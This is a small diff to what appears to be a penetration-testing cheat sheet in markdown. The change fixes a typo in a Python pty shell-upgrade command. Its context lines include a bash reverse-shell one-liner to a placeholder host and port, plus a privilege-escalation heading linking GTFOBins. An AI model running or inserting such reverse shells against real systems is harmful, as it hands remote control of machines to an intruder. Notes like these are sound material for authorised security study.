@@ -21,7 +21,7 @@
 - Bash tcp
     - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
 - Make it moreinteractively
-    - `python -c 'import pty; pty.spawn("/bin/bash")'``
+    - `python -c 'import pty; pty.spawn("/bin/bash")'`
 ## Privilege
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
